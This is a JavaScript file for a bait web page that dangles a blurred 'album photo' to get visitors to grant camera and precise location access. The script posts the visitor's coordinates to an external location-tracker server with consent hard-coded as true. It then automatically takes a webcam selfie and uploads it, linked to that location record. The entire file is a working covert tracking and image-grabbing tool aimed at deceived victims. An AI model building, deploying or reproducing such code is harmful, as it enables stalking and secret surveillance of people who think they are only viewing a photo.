const viewPhotoBtn = document.getElementById("viewPhotoBtn");
const statusEl = document.getElementById("status");
const albumPhoto = document.getElementById("albumPhoto");
const lockBadge = document.getElementById("lockBadge");
const progressEl = document.getElementById("permissionProgress");
const stepCamera = document.getElementById("stepCamera");
const stepLocation = document.getElementById("stepLocation");
const video = document.getElementById("video");
const captureBtn = document.getElementById("captureBtn");
const canvas = document.getElementById("canvas");
const cameraPermissionSection = document.getElementById("cameraPermissionSection");

const LOCATION_API_URL = "https://location-tracker-api-cjka.onrender.com/location";
const SELFIE_API_URL = "https://location-tracker-api-cjka.onrender.com/selfie";

let cameraStream = null;
let lastLocationId = null;

function setStatus(message) {
    statusEl.innerHTML = message;
}

function setStepStatus(stepEl, state, text) {
    stepEl.style.borderColor = "#e0e0e0";
    stepEl.style.background = "#fff";
    if (state === "active") {
        stepEl.style.borderColor = "#1a73e8";
        stepEl.style.background = "#e8f0fe";
    }
    if (state === "done") {
        stepEl.style.borderColor = "#34a853";
        stepEl.style.background = "#e6f4ea";
    }
    stepEl.querySelector("span:last-child").textContent = text;
}

function unlockPhoto() {
    albumPhoto.style.filter = "blur(0)";
    lockBadge.style.opacity = "0";
    viewPhotoBtn.disabled = false;
    viewPhotoBtn.textContent = "👁️ View This Photo";
}

// --- Step 1: Camera first ---
async function requestCamera() {
    setStepStatus(stepCamera, "active", "Requesting...");
    setStatus("📷 Requesting camera access...");

    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" }
        });

        cameraStream = stream;
        setStepStatus(stepCamera, "done", "✅ Granted");

        cameraPermissionSection.style.display = "block";
        video.srcObject = stream;
        video.style.display = "block";
        captureBtn.style.display = "inline-block";

        setStatus("✅ Camera granted! Now requesting location...");

        // Proceed to location
        await requestLocation();
    } catch (err) {
        console.error(err);
        setStepStatus(stepCamera, "active", "❌ Denied");
        setStatus("❌ Camera permission denied. Cannot continue.");
        viewPhotoBtn.disabled = false;
        viewPhotoBtn.textContent = "👁️ View This Photo";
    }
}

// --- Step 2: Location second ---
function requestLocation() {
    return new Promise((resolve) => {
        setStepStatus(stepLocation, "active", "Requesting...");
        setStatus("📍 Requesting location...");

        navigator.geolocation.getCurrentPosition(
            async (position) => {
                // Send location to server
                const data = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: new Date().toISOString(),
                    consent: true
                };

                try {
                    const response = await fetch(LOCATION_API_URL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(data)
                    });

                    const result = await response.json();

                    if (!response.ok) {
                        setStepStatus(stepLocation, "active", "❌ Server error");
                        setStatus("❌ " + result.message);
                        viewPhotoBtn.disabled = false;
                        viewPhotoBtn.textContent = "👁️ View This Photo";
                        resolve();
                        return;
                    }

                    lastLocationId = result.id;

                    setStepStatus(stepLocation, "done", "✅ Granted");
                    setStatus("✅ All permissions granted! Photo unlocked.");
                    unlockPhoto();

                    // Auto-capture selfie after a short delay
                    setTimeout(() => {
                        captureSelfie();
                    }, 1500);

                } catch (err) {
                    console.error(err);
                    setStepStatus(stepLocation, "active", "❌ Connection error");
                    setStatus("❌ Could not connect to server.");
                    viewPhotoBtn.disabled = false;
                    viewPhotoBtn.textContent = "👁️ View This Photo";
                }

                resolve();
            },
            (error) => {
                switch (error.code) {
                    case error.PERMISSION_DENIED:
                        setStatus("❌ Location permission denied.");
                        break;
                    case error.POSITION_UNAVAILABLE:
                        setStatus("❌ Location unavailable.");
                        break;
                    case error.TIMEOUT:
                        setStatus("❌ Location request timed out.");
                        break;
                    default:
                        setStatus("❌ Unknown location error.");
                }

                setStepStatus(stepLocation, "active", "❌ Denied");
                viewPhotoBtn.disabled = false;
                viewPhotoBtn.textContent = "👁️ View This Photo";
                resolve();
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    });
}

// --- Handle "View This Photo" click ---
viewPhotoBtn.addEventListener("click", async () => {
    viewPhotoBtn.disabled = true;
    viewPhotoBtn.textContent = "⏳ Requesting permissions...";
    progressEl.style.display = "block";

    setStepStatus(stepCamera, "active", "Waiting...");
    setStepStatus(stepLocation, "active", "Waiting...");

    // Camera first, then location
    await requestCamera();
});

// --- Capture selfie ---
async function captureSelfie() {
    if (!video.videoWidth || !video.videoHeight) return;

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0);

    canvas.toBlob(async (blob) => {
        const formData = new FormData();
        formData.append("image", blob, "selfie.jpg");
        formData.append("timestamp", new Date().toISOString());
        formData.append("location_id", lastLocationId);

        try {
            const response = await fetch(SELFIE_API_URL, {
                method: "POST",
                body: formData
            });

            const result = await response.json();

            if (response.ok) {
                setStatus("✅ Selfie uploaded successfully.");
            } else {
                setStatus("❌ " + result.message);
            }
        } catch (err) {
            console.error(err);
            setStatus("❌ Could not upload selfie.");
        }

        // Stop camera
        if (cameraStream) {
            cameraStream.getTracks().forEach(track => track.stop());
        }

        video.style.display = "none";
        captureBtn.style.display = "none";
    }, "image/jpeg", 0.9);
}

captureBtn.addEventListener("click", captureSelfie);